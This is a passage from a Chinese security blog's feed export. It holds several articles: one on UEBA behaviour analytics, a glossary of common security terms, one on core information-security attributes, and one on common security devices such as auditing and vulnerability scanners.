自动识别高权限账号，例如管理员、服务和共享帐户，然后监控他们与攻击相关的异常行为，确定高风险异常行为是否源于高权限用户被成功攻击。</li><li>关键应用监控 – 为所有关键应用程序和系统构建访问风险评估，以识别与其敏感数据和交易相关的所有高风险用户、访问和活动。</li><li>内部欺诈侦测 – 利用同组人员的异常行为，比较分析侦测潜在的内部欺诈行为。</li></ol><h2 id="3-数据渗漏"><a href="#3-数据渗漏" class="headerlink" title="3 数据渗漏"></a>3 数据渗漏</h2><p>一般而言，各类攻击的主要意图是窃取组织中最重要的数据资产。组织一般会部署监控数据流向的 DLP 产品，数据库安全或者应用访问类产品以保护公司的核心数据资产。这类数据防护类产品往往误报很多，每天产生的海量报警让安全团队难以真正聚焦重点。UEBA 可以对应用访问以及 DLP 日志做更深层次的多维分析，从而定位出真正的高风险数据泄漏风险。具体的场景设计可以从以下维度考虑。<br>应用系统访问监控/风险分析 – 对存储敏感数据的应用系统、文件服务器等的访问进行行为监控，通过与用户过去行为或其同组行为异常行相比较，自动识别并持续监控与此数据相关的高风险访问和活动。<br>DLP 事件评估 – 将 DLP 事件做多维度关联分析，比如说发生 DLP 事件的人，他的风险等级、是否有离职倾向、敏感数据下载/外发/打印的数量、频次、数据外流的目的地是否为竞争对手等等，从而进一步定位高风险。高风险人群的 DLP 事件优先处置，并且通过多维度分析往往也能进一步定位这些数据泄漏企图背后的动机。</p><h2 id="4-失陷主机"><a href="#4-失陷主机" class="headerlink" title="4 失陷主机"></a>4 失陷主机</h2><p>除了人员行为异常以外，重要的 IT 资产比如说各种应用服务器、重要的终端等行为异常检测对很多组织也是至关重要。例如，一个重要的应用服务器执行了一个非业务的应用或进程，打开了一个新的端口，外连了从未外连的地址/端口，忽然有长链接的 SSH 会话，系统目录下忽然出现新的可疑文件等等。这些异常行为往往是服务器被攻击的征兆，需要进一步分析与取证。<br>用 UEBA 技术定位失陷主机通常的思路是，基于相应设备和主机执行的高风险异常事件和活动，建立异常时间线，然后关联各种实体参数，包括：端点安全警报、漏洞扫描结果（常见漏洞评分系统[CVSS]）、用户或帐户的风险级别、访问的目标、请求的有效负载的数据包级别等等，从多维度检测任何异常活动或事件以确定风险评分。</p><h1 id="四、UEBA主要实现技术"><a href="#四、UEBA主要实现技术" class="headerlink" title="四、UEBA主要实现技术"></a>四、UEBA主要实现技术</h1><p>UEBA 是一个完整的系统，涉及到算法、工程等检测部分，以及用户实体风险评分排序、调查等用户交互、反馈。从架构上来看，UEBA 系统一般包含三个层次，分别是数据中心层、算法分析层、场景应用层。其中，算法分析层一般大数据计算平台之上运行实时分析、统计分析、关联分析、机器学习等分析引擎。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220324/UEBA%E6%9E%B6%E6%9E%84.png" alt="UEBA架构"></p><p>机器学习引擎实现，如基线及群组分析、异常检测、集成学习风险评分、安全知识图谱、强化学习等UEBA 核心技术。</p><h2 id="基线及群组分析"><a href="#基线及群组分析" class="headerlink" title="基线及群组分析"></a>基线及群组分析</h2><p>历史基线，是行为分析的重要部分，通过构建群组分析，可以跨越单个用户、实体的局限，看到更大的事实；通过对比群组，易于异常检测；通过概率评估可以降低误报，提升信噪比；组合基线分析、群组分析，可以构成全时空的上下文环境。</p><h2 id="异常检测"><a href="#异常检测" class="headerlink" title="异常检测"></a>异常检测</h2><p>异常检测关注发现统计指标异常、时序异常、序列异常、模式异常等异常信号，采用的技术包括孤立森林、K 均值聚类、时序分析、异常检测、变点检测等传统机器学习算法。现代的异常检测也利用深度学习技术，包括基于变分自编码器（VAE）的深度表征重建异常检测、基于循环神经网络（RNN）和长短时记忆网络（LSTM）的序列深度网络异常检测、图神经网络（GNN）的模式异常检测等。针对标记数据缺乏的现状，某些UEBA 系统能够采用主动学习技术（Active Learning）、自学习（Self Learning），充分发掘标记数据和无标记数据的价值。</p><h2 id="集成学习风险评分"><a href="#集成学习风险评分" class="headerlink" title="集成学习风险评分"></a>集成学习风险评分</h2><p>把安全运维从事件管理转换到用户、实体风险，极大的降低工作量、提升效率。其中，实现转换的关键在于使用集成学习进行风险评分。风险评分需要综合各种告警、异常，以及进行群组对比分析和历史趋势。同时，风险评分技术中用户间风险的传导同样重要，需要一套类似谷歌搜索使用的网页排名PageRank 算法的迭代评估机制。风险评分的好坏，将直接影响到UEBA 实施的成效，进而直接影响到安全运营的效率。</p><h2 id="安全知识图谱"><a href="#安全知识图谱" class="headerlink" title="安全知识图谱"></a>安全知识图谱</h2><p>知识图谱已经成为人工智能领域的热点方向，在网络安全中同样也有巨大的应用潜力。部分UEBA 系统已经支持一定的安全知识图谱能力，可以将从事件、告警、异常、访问中抽取出的实体及实体间关系，构建成一张网络图谱。任何一个事件、告警、异常，都可以集成到网络图谱中，直观、明晰的呈现多层关系，可以让分析抵达更远的边界，触达更隐蔽的联系，揭露出最细微的线索。结合攻击链和知识图谱的关系回放，还能够让安全分析师近似真实的复现攻击全过程，了解攻击的路径与脆弱点，评估潜在的受影响资产，从而更好的进行应急响应与处置。</p><h2 id="强化学习"><a href="#强化学习" class="headerlink" title="强化学习"></a>强化学习</h2><p>不同客户的环境数据源的多元性及差异性，以及用户对异常风险的定义各有不同， UEBA 需要具有一定的自适应性，输出更精准的异常风险。强化学习能够根据排查结果自适应地调整正负权重反馈给系统，进而得到更符合客户期望的风险评分。UEBA 给出异常信号后，结合安全管理人员的排查结果，获取反馈奖赏或惩罚，通过学习进行正负权重调整，从而让整体效果持续优化改进。</p><h1 id="五、UEBA行业发展趋势"><a href="#五、UEBA行业发展趋势" class="headerlink" title="五、UEBA行业发展趋势"></a>五、UEBA行业发展趋势</h1><p>Gartner《Market Guide for User and Entity Behavior Analytics》报告中指出：<br>终端用户在UEBA独立解决方案上的支出将呈复合式增长年增长率为48％，从2015年的5,000万美元增长到2020年的3.52亿美元。<br>UEBA解决方案供应商在2017年和2018年继续减少，主要是由于收购活动。Gartner预计该领域将继续整合，同时在其服务于相邻细分市场的产品中使用UEBA技术的厂商数量也在大幅增加。<br>到2021年，用户和实体行为分析（UEBA）市场将不再是一个独立的市场。<br>一些UEBA供应商现在将其市场战略路线聚焦于将其核心UEBA技术嵌入其他供应商的更传统的安全解决方案中。到2022年，UEBA的核心技术将嵌入80％的威胁检测和事件高级解决方案中（如SIEM）。<br>Gartner认为这一趋势将持续到2022年，届时UEBA将成为被更广泛的安全分析技术所取代。</p><p>IndustryARC《UEBA Market - Forecast(2020 - 2025)》报告：<br>到2025年，用户和实体行为分析市场预计将达到49亿美元，从2020年到2025年，复合年增长率为41.5％。<br>UEBA是一种用于检测内部风险，财务欺诈和针对性攻击的机制。该方法用于分析人类行为模式，然后使用统计分析和算法来识别差异。<br>UEBA是一种机器学习模型，可以通过检测保护异常来帮助阻止网络攻击者。UEBA使用高级分析，汇总日志和报告数据，并分析数据包，流，文件和其他类型的信息以及其他类型的威胁数据，以评估某些形式的活动和动作是否可能构成网络攻击。<br>UEBA的优势包括–内部威胁识别，防止数据泄露，识别和防止欺诈，可操作的风险信息以及IP数据的安全性。<br>UEBA逐渐成为对全面网络威胁和欺诈的最有希望的回应。软件提供商更专注于确保可靠的算法和集成分析，以及开发应用程序系统。</p><p>综合上述报告可以看出：<br>UEBA市场价值正在飞速上升，UEBA技术研究前景广阔。<br>UEBA发展方向不再是一个独立个体，而是倾向于将UEBA技术嵌入到其他高级安全解决方案中。</p><hr><p>作者博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注微信公众号,一起学习、成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络信息安全常用术语</title>
      <link href="/posts/78dcbe69/"/>
      <url>/posts/78dcbe69/</url>
      
        <content type="html"><![CDATA[<p>网络信息安全术语是获取网络安全知识和技术的重要途径，常见的网络安全术语可以分为基础技术类、风险评估技术类、防护技术类、检测技术类、响应/恢复技术类、测评技术类等。</p><p>下面主要介绍常见的网络安全技术方面的术语</p><h2 id="一、基础技术类"><a href="#一、基础技术类" class="headerlink" title="一、基础技术类"></a>一、基础技术类</h2><p>基础技术类常见的是密码及加解密相关的技术<br><strong>密码（Cipher）</strong><br>一种用于加密和解密数据的算法。</p><p><strong>密码学（Cryptography）</strong><br>编码研究。同样，使用代码/密码/数学技术来保护数据并提供实体和数据的身份验证。</p><p><strong>密钥（Secret key）</strong><br>用于加密和解密的加密密钥，使对称密钥加密方案能够运行。</p><p><strong>编码(Encode)</strong><br>使用代码将一种符号转换为另外一种符号。</p><p><strong>加密(Encryption)</strong><br>使用密码来保护信息，这使任何没有密钥对其解密的人都无法读取。</p><p><strong>解密（Decryption）</strong><br>将编码文本解密为原始原始格式的过程。</p><p><strong>证书（Certificate）</strong><br>数字证书是数字身份验证的一种形式，它允许计算机，用户或组织安全地交换信息。</p><h2 id="二、攻击技术类"><a href="#二、攻击技术类" class="headerlink" title="二、攻击技术类"></a>二、攻击技术类</h2><p><strong>拒绝服务（Denial of Service）</strong><br>是指通过向 服务器 发送大量垃圾信息或干扰信息的 方式 ，导致服务器无法向正常用户提供服务的现象。</p><p><strong>分布式拒绝服务（Distributed Denial of Service）</strong><br>指处于不同位置的多个攻击者同时向一个或数个目标发动攻击，或者一个攻击者控制了位于不同位置的多台机器并利用这些机器对受害者同时实施攻击。由于攻击的发出点是分布在不同地方的，这类攻击称为分布式拒绝服务攻击。</p><p><strong>网页篡改（Website Distortion）</strong><br>网页篡改是恶意破坏或更改网页内容，使网站无法正常工作或出现黑客插入的非正常网页内容。</p><p><strong>网页仿冒（Phishing）</strong><br>网页仿冒是通过构造与某一目标网站高度相似的页面（俗称钓鱼网站），并通常以垃圾邮件、即时聊天、手机短信或网页虚假广告等方式发送声称来自于被仿冒机构的欺骗性消息，诱骗用户访问钓鱼网站，以获取用户个人秘密信息（如银行账号和账户密码）。</p><p><strong>网页挂马（Website Malicious Code）</strong><br>网页挂马是通过在网页中嵌入恶意代码或链接，致使用户计算机在访问该页面时被植入恶意代码。</p><p><strong>域名劫持（DNS Hijack）</strong><br>域名劫持是通过拦截域名解析请求或篡改域名服务器上的数据，使得用户在访问相关域名时返回虚假IP地址或使用户的请求失败。</p><p><strong>路由劫持（Routing Hijack）</strong><br>路由劫持是通过欺骗方式更改路由信息，以导致用户无法访问正确的目标，或导致用户的访问流量绕行黑客设定的路径，以达到不正当的目的。</p><p><strong>垃圾邮件（Spam）</strong><br>垃圾邮件是将不需要的消息（通常是未经请求的广告）发送给众多收件人。包括：收件人事先没有提出要求或者同意接受的广告、电子刊物、各种形式的宣传品等宣传性的电子邮件；收件人无法拒收的电子邮件；隐藏发件人身份、地址、标题等信息的电子邮件；含有虚假的信息源、发件人、路由等信息的电子邮件。</p><p><strong>特洛伊木马（Trojan Horse）</strong><br>特洛伊木马（简称木马）是以盗取用户个人信息，甚至是远程控制用户计算机为主要目的的恶意代码。由于它像间谍一样潜入用户的电脑，与战争中的 “木马”战术十分相似，因而得名木马。按照功能，木马程序可进一步分为：盗号木马、网银木马、窃密木马、远程控制木马、流量劫持木马和其他木马六类。</p><p><strong>网络蠕虫（Network Worm）</strong><br>网络蠕虫是指能自我复制和广泛传播，以占用系统和网络资源为主要目的恶意代码。按照传播途径，蠕虫可进一步分为：邮件蠕虫、即时消息蠕虫、U盘蠕虫、漏洞利用蠕虫和其他蠕虫五类。</p><p><strong>僵尸程序（Bot）</strong><br>僵尸程序是用于构建僵尸网络以形成大规模攻击平台的恶意代码。按照使用的通信协议，僵尸程序可进一步分为：IRC僵尸程序、Http僵尸程序、P2P僵尸程序和其他僵尸程序四类。</p><p><strong>僵尸网络（Bot Net）</strong><br>僵尸网络是被黑客集中控制的计算机群，其核心特点是黑客能够通过一对多的命令与控制信道操纵感染僵尸程序的主机执行相同的恶意行为，如可同时对某目标网站进行分布式拒绝服务攻击，或发送大量的垃圾邮件等。</p><p><strong>SQL注入（SQL injection）</strong><br>一种使用代码注入来攻击由数据驱动的应用程序的策略。恶意注入的SQL代码可以执行多种操作，包括将所有数据转储到攻击者控制的位置的数据库中。通过这种攻击，恶意黑客可以欺骗身份，修改数据或篡改数据，泄露机密数据，删除和销毁数据或使其不可用。他们还可以完全控制数据库。</p><p><strong>网络钓鱼（Phishing）</strong><br>大量电子邮件要求提供敏感信息或将其推送到假网站。这些电子邮件通常没有针对性。</p><p><strong>宏病毒（Macro virus）</strong><br>一种恶意代码，使用文档应用程序的宏编程功能来执行不当行为，自我复制并在整个系统中传播。</p><p><strong>恶意代码（Malicious code）</strong><br>恶意代码是指在未经授权的情况下，在信息系统中安装、执行以达到不正当目的的程序。旨在损害信息系统的机密性，完整性或可用性。</p><p><strong>恶意广告（Malvertising）</strong><br>使用在线广告投放恶意软件。</p><p><strong>恶意软件（Malware）</strong><br>恶意软件的简称。任何可能对组织或个人造成不利影响的病毒，特洛伊木马，蠕虫，代码或内容。</p><p><strong>中间人攻击（MitM）</strong><br>网络罪犯将自己置于受害者和受害者试图访问的网站之间，以获取正在传输的信息或对其进行更改。有时缩写为MITM，MIM，MiM或MITMA。</p><p><strong>逻辑炸弹（Logic bomb）</strong><br>一段带有一组秘密指令的代码。它被插入系统并由特定操作触发。该代码通常执行恶意操作，例如删除文件。</p><p><strong>高级持久威胁（APT）</strong><br>一种网络攻击，使用复杂的技术持续对目标政府和公司进行网络间谍活动或其他恶意活动。通常由具有丰富专业知识和大量资源的对手进行-通常与民族国家参与者相关。<br>这些攻击往往来自多个入口点，并且可能使用多个攻击媒介（例如，网络攻击，物理攻击，欺骗攻击）。一旦系统遭到破坏，结束攻击可能非常困难。</p><p><strong>被动攻击（Passive attack）</strong><br>攻击者试图获取机密信息以将其提取。因为他们不尝试更改数据，所以这种类型的攻击更难检测-因此称为“被动”。</p><p><strong>密码嗅探（Password sniffing）</strong><br>通过监视或监听网络流量以检索密码数据来收集密码的技术。</p><p><strong>有效载荷（Payload）</strong><br>执行恶意操作的恶意软件元素–网络安全性等同于导弹的爆炸性电荷。通常说来是造成破坏的。</p><p><strong>勒索软件（Ransomware）</strong><br>勒索软件是一种恶意软件（恶意软件），它对PC或移动设备上的所有数据进行加密，从而阻止数据所有者对其进行访问。感染发生后，受害者会收到一条消息，告知他/她必须支付一定数量的钱（通常以比特币支付）才能获得解密密钥。通常，支付赎金也有时间限制。如果受害者支付赎金，则不能保证解密密钥会被移交。最可靠的解决方案是至少在三个不同的位置备份数据（以确保冗余），并使这些备份保持最新状态，这样您就不会失去重要的进展。</p><p><strong>社会工程学（Social engineering）</strong><br>操纵人们执行特定的动作或泄露对攻击者有用的信息。操纵策略包括谎言，心理技巧，贿赂，勒索，假冒和其他类型的威胁。社交工程通常用于提取数据并获得对信息系统的未授权访问，这些信息系统可以是单个私人用户，也可以是组织的信息系统。</p><h2 id="三、防护技术类"><a href="#三、防护技术类" class="headerlink" title="三、防护技术类"></a>三、防护技术类</h2><p><strong>访问控制（Access Control）</strong><br>访问控制是按用户身份及其所归属的某项定义组来限制用户对某些信息项的访问，或限制对某些控制功能的使用的一种技术。</p><p><strong>防火墙（Firewall）</strong><br>网络或设备周围的虚拟边界，用于保护网络或设备免受不必要的访问。可以是硬件或软件。</p><p><strong>入侵防御系统（Intrusion Prevention System）</strong><br>是一部能够监视网络或网络设备的网络资料传输行为的计算机网络安全设备，能够及时的中断、调整或隔离一些不正常或是具有伤害性的网络资料传输行为。</p><p><strong>防毒软件(Antivirus)</strong><br>防病毒软件用于监视计算机或网络，以检测从恶意代码到恶意软件的网络安全威胁。防病毒程序不仅可以警告您威胁的存在，还可以删除或消除恶意代码。</p><p><strong>蜜罐（蜜网）Honeypot (honeynet)</strong><br>诱骗系统或网络，用于吸引潜在的攻击者，通过检测攻击或使攻击发生偏转来保护实际系统。一个学习攻击方式的好工具。多个蜜罐可以组成一个蜜网。</p><p><strong>安全信息和事件管理（SIEM）</strong><br>用于监视，记录，提供警报和分析安全事件以支持威胁检测和事件响应的软件。</p><p><strong>安全监控（Security monitoring）</strong><br>从一系列安全系统中收集数据，并将这些信息与威胁情报进行关联和分析，以识别出受到威胁的迹象。</p><h2 id="四、检测技术类"><a href="#四、检测技术类" class="headerlink" title="四、检测技术类"></a>四、检测技术类</h2><p><strong>入侵检测（Instrusion Detection）</strong><br>是一种对网络传输进行即时监视，在发现可疑传输时发出警报或者采取主动反应措施的网络安全设备。</p><p><strong>漏洞扫描（Vulnerability Scanning）</strong><br>是对网络设备及应用服务的可用性、安全性与合规性等进行扫描，发现可利用漏洞的一种安全检测（渗透攻击）行为。</p><p><strong>威胁分析（Threat analysis）</strong><br>对单个威胁的特征进行详细评估。</p><h2 id="五、响应-恢复技术类"><a href="#五、响应-恢复技术类" class="headerlink" title="五、响应/恢复技术类"></a>五、响应/恢复技术类</h2><p><strong>应急响应（Emergency Response）</strong><br>应急响应通常是指一个组织为了应对各种意外事件的发生所做的准备工作以及在突发事件发生时或者发生后所采取的措施。</p><p><strong>灾难恢复（Disaster Recovery）</strong><br>灾难恢复也称灾备，指自然或人为 灾害 后，重新启用 信息系统 的 数据 、 硬件 及 软体 设备，恢复正常商业运作的过程。</p><p><strong>备份文件（Backup files）</strong><br>一种用户以后数据恢复的文件</p><p><strong>备份（Backup）</strong><br>为应付文件、数据丢失或损坏等可能出现的意外情况，将电子计算机存储设备中的数据复制到磁带等大容量存储设备中。从而在原文中独立出来单独贮存的程序或文件副本。</p><p><strong>应急预案（Contingency plan）</strong><br>一种关于备份、应急响应和灾后恢复的计划。</p><p><strong>灾难恢复计划（Disaster recovery plan）</strong><br>信息系统灾难恢复过程中所需要的任务、行动、数据和资源的文件，用于指导相关人员在预定的灾难恢复目标内恢复系统系统支持的关键业务功能。</p><h2 id="六、评测技术类"><a href="#六、评测技术类" class="headerlink" title="六、评测技术类"></a>六、评测技术类</h2><p><strong>评价方案（Evaluation scheme）</strong><br>针对一个特定的团体，由某一评价机构根据指定标准制定的行政管理的与规章制度的框架。</p><p><strong>渗透测试（Penetration testing）</strong><br>一种旨在探查和暴露信息系统中的安全性弱点以便对其进行修复的测试。</p><p><strong>质量评价（Quality evaluation）</strong><br>对实体满足规定要求程度而进行的系统性检查</p><p><strong>威胁评估（Threat assessment）</strong><br>识别或评估具有或表明可能危害生命，信息，操作和/或财产的实体，动作或事件（自然或人为）的产品或过程。</p><hr><p>作者博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注微信公众号,一起学习、成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络信息安全基本属性</title>
      <link href="/posts/ec5a2543/"/>
      <url>/posts/ec5a2543/</url>
      
        <content type="html"><![CDATA[<p>常见的网络信息安全基本属性主要有机密性、完整性、可用性、不可抵赖性和可控性等，其中<strong>机密性（Confidentiality）、完整性（Integrity）、可用性（Availability）被称为网络信息系统核心的CIA安全属性</strong>，此外还有其他的安全属性包括：真实性、时效性、合规性、隐私性等。</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220317/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E6%9C%AC%E5%B1%9E%E6%80%A7.png" alt="网络信息安全基本属性"></p><h2 id="机密性"><a href="#机密性" class="headerlink" title="机密性"></a>机密性</h2><p>机密性（Confidentiality）是指网络信息不泄露给非授权的用户、实体或程序，能够防止非授权者获取信息。这些信息不仅包括国家机密，也包括企业和社会团体的商业机密和工作机密，还包括个人信息。例如，网络信息系统上传递口令敏感信息，若一旦攻击者通过监听手段获取到，就有可能危及网络系统的整体安全。人们在应用网络时很自然地要求网络能提供保密性服务，而被保密的信息既包括在网络中传输的信息，也包括存储在计算机系统中的信息。就像电话可以被窃听一样，网络传输信息也可以被窃听，解决的办法就是对传输信息进行加密处理。存储信息的机密性主要通过访问控制来实现，不同用户对不同数据拥有不同的权限。</p><h2 id="完整性"><a href="#完整性" class="headerlink" title="完整性"></a>完整性</h2><p>完整性（Integrity）是指网络信息或系统未经授权不能进行改变的特性。即信息在存储或传输过程中保持不被修改、不被破坏和丢失的特性。数据的完整性是指保证计算机系统上的数据和信息处于一种完整和未受损害的状态，这就是说数据不会因为有意或无意的事件而被改变或丢失。除了数据本身不能被破坏外，数据的完整性还要求数据的来源具有正确性和可信性，也就是说需要首先验证数据是真实可信的，然后再验证数据是否被破坏。影响数据完整性的主要因素是人为的蓄意破坏，也包括设备的故障和自然灾害等因素对数据造成的破坏。</p><h2 id="可用性"><a href="#可用性" class="headerlink" title="可用性"></a>可用性</h2><p>可用性（Availability）是指合法许可的用户能够及时获取网络信息或服务的特征，即可授权实体或用户访问并按要求使用信息的特性。简单地说，就是保证信息在需要时能为授权者所用，防止由于主客观因素造成的系统拒绝服务。例如，网站能够给用户提供正常的网页访问服务，防止拒绝服务攻击。</p><h2 id="不可抵赖性"><a href="#不可抵赖性" class="headerlink" title="不可抵赖性"></a>不可抵赖性</h2><p>不可抵赖性也称不可否认性。是指防止网络信息系统相关用户否认其活动行为的特性。在信息交换过程中，确信参与方的真实同一性，即所有参与者都不能否认和抵赖曾经完成的操作和承诺。简单地说，就是发送信息方不能否认发送过信息，信息的接收方不能否认接收过信息。利用信息源证据可以防止发信方否认已发送过信息，利用接收证据可以防止接收方事后否认已经接收到信息。数据签名技术是解决不可否认性的重要手段之一。</p><h2 id="可控性"><a href="#可控性" class="headerlink" title="可控性"></a>可控性</h2><p>可控性是指网络信息系统责任主体对其具有管理、支配能力的属性，能够根据授权规则对系统进行有效掌握和控制，使得管理者有效地控制系统的行为和信息的使用，符合系统运行目标。是人们对信息的传播路径、范围及其内容所具有的控制能力，如：不允许不良内容通过公共网络进行传输，使信息在合法用户的有效掌控之中</p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>除常见的网络信息系统安全特性，还有真实性、时效性、合规性、公平性、可靠性、可生存性和隐私性等，这些安全特性适用于不同类型的网络信息系统，其要求程度有所差异。</p><h3 id="1-真实性"><a href="#1-真实性" class="headerlink" title="1.真实性"></a>1.真实性</h3><p>真实性是指网络空间信息与实际物理空间、社会空间的客观事实保持一致性。如，网络谣言信息不符合真实情况，违背了客观事实。</p><h3 id="2-时效性"><a href="#2-时效性" class="headerlink" title="2.时效性"></a>2.时效性</h3><p>时效性是指网络空间信息、服务及系统能够满足时间约束要求。如，汽车安全驾驶的智能控制系统要求信息具有实时性，信息在规定时间范围内才有效。</p><h3 id="3-合规性"><a href="#3-合规性" class="headerlink" title="3.合规性"></a>3.合规性</h3><p>合规性是指网络信息、服务及系统符合法律法规政策、标准规范等要求。如，网站内容如何法律法规政策要求等。</p><h3 id="4-公平性"><a href="#4-公平性" class="headerlink" title="4.公平性"></a>4.公平性</h3><p>公平性是指网络信息系统相关主体处于同等地位处理相关任务，任何一方不占据优势的特性要求。如，电子合同签订双方符合公平性要求，在同一时间签订合同。</p><h3 id="5-可靠性"><a href="#5-可靠性" class="headerlink" title="5.可靠性"></a>5.可靠性</h3><p>可靠性是指网络信息系统在规定条件及时间下，能够有效完成预定的系统功能的特性。</p><h3 id="6-可生存性"><a href="#6-可生存性" class="headerlink" title="6.可生存性"></a>6.可生存性</h3><p>可生存性是指网络信息系统在安全受损的情形下，提供最小化、必要的服务功能，能够支撑业务继续运行的安全特性。</p><h3 id="7-隐私性"><a href="#7-隐私性" class="headerlink" title="7.隐私性"></a>7.隐私性</h3><p>隐私性是指有关个人的敏感信息不对外公开的安全属性，如个人的身份证号码、住址、电话号码、工资收入、疾病状况、社交关系等。</p><p>网络攻击是指损害网络系统安全属性的危害行为。危害行为导致网络系统的机密性、可用性、可控性、真实性、抗抵赖性等受到不同程度的破坏。常见的危害行为有四个基本类型：</p><ul><li>信息泄露攻击； </li><li>完整性破坏攻击； </li><li>拒绝服务攻击； </li><li>非法使用攻击。</li></ul><p>本文整理自《信息安全工程师教程第2版》</p><hr><p>作者博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注微信公众号,一起学习、成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全之常用安全设备功能及作用</title>
      <link href="/posts/4696bbec/"/>
      <url>/posts/4696bbec/</url>
      
        <content type="html"><![CDATA[<p>随着网络技术发展，网络威胁无孔不入，网络攻击手段呈现复杂性及多变性的趋势。要建立防御体系应从通信网络、网络边界、局域网络内部、各种业务应用平台等各个层次落实各种安全措施，形成纵深防御体系。单靠一种或几种安全设备就想保护整个网络是不可能的事情。因此，为了满足不同防护需求的安全设备应运而生。有的设备是为了严防非授权访问。有的设备是为了实时检测，拦截攻击行为。有的设备是为了自查自审，发现自身存在的问题。每一种安全设备分工都不同，设备缺失肯定会使防御体系失效造成安全隐患。</p><p>本文介绍常用的安全设备及其能力</p><h3 id="网络安全审计"><a href="#网络安全审计" class="headerlink" title="网络安全审计"></a>网络安全审计</h3><p>网络安全审计通过对网络数据的采集、分析、识别，实时动态监测通信内容、网络行为和网络流量，发现和捕获各种敏感信息、违规行为，实时报警响应，全面记录网络系统中的各种会话和事件，实现对网络信息的智能关联分析、评估及安全事件的准确定位，为整体网络安全策略的制定提供权威可靠的支持。</p><ul><li>内容审计<br>可对网页内容、邮件、数据库操作、论坛、即时通讯等提供完整的文本、图片和音视频内容检测、信息还原功能；并可自定义关键字库，进行细粒度的审计追踪。</li><li>行为审计<br>根据设定的行为审计策略，对网站访问、邮件收发、数据库访问、远程终端访问、文件上传下载、即时通讯、论坛、移动应用、在线视频、P2P 下载、网络游戏等网络应用行为进行监测，对符合行为策略的事件实时告警并记录。</li><li>流量审计<br>支持基于智能协议识别的流量分析功能；实时统计出当前网络中的各种协议流量，进行综合流量分析，提供详细的流量报表；可以统计指定协议流量的IP TOP N，为流量管理策略的制定提供可靠支持。</li></ul><h3 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h3><p>通过漏洞扫描全面发现信息系统存在的安全漏洞、安全配置问题、应用系统安全漏洞，检查系统存在的弱口令，收集系统不必要开放的账号、服务、端口，形成整体安全风险报告。</p><ul><li>全面系统脆弱性发现<br>能够全方位检测系统存在的脆弱性，发现信息系统存在的安全漏洞、安全配置问题、应用系统安全漏洞，检查系统存在的弱口令，收集系统不必要开放的账号、服务、端口，形成整体安全风险报告，帮助安全管理人员先于攻击者发现安全问题，及时进行修补。</li><li>风险统一分析<br>支持全方位的安全漏洞、安全配置、应用系统安全漏洞扫描，通过安全风险计算方法，对网络系统中多个方面的安全脆弱性统一进行分析和风险评估，给出总体安全状态评价，全面掌握信息系统安全风险。</li><li>识别非标准端口<br>应用先进的非标准端口识别技术、以及丰富的协议指纹库，能够快速准确的识别非标准端口上的应用服务类型，并进一步进行漏洞检测，避免扫描过程中的漏报和误报。</li><li>漏洞、配置知识库<br>依托安全知识库，涵盖所有主流基础系统、应用系统、网络设备等网元对象，提供系统<br>的配置检查库，提供专业安全厂商的加固修补建议，以及多个行业的安全配置检查标准。</li></ul><h3 id="Web漏洞扫描"><a href="#Web漏洞扫描" class="headerlink" title="Web漏洞扫描"></a>Web漏洞扫描</h3><p>定位于Web 脆弱性评估，实现全面Web 应用安全检测。帮助用户全面发现Web 漏洞，准确掌控网站风险，深度跟踪漏洞态势，提升快速响应能力。</p><ul><li>漏洞扫描及验证<br>支持系统漏洞扫描以及Web 漏洞扫描，支持Web 应用漏洞分类，全面覆盖OWASP TOP10 应用风险，高中危漏洞专家级验证。</li><li>网站挂马及黑链检测<br>依托沙箱检测技术，识别网站页面中的恶意代码，对潜藏在用户网页中的黄赌毒私服等广告黑链进行周期性检测，并将挂马及黑链情况及时邮件提醒。</li><li>网站篡改检测<br>依托相似度对比技术，识别网页变更状态，并通知用户。</li><li>网页敏感内容检测<br>依托于敏感内容词库，识别网页中的敏感内容，并邮件提醒。</li><li>可用性检测及 DNS 解析检测<br>依托多个检测节点，多条检测线路，识别网站运营是否稳定的问题，并邮件提醒。</li></ul><h3 id="堡垒机"><a href="#堡垒机" class="headerlink" 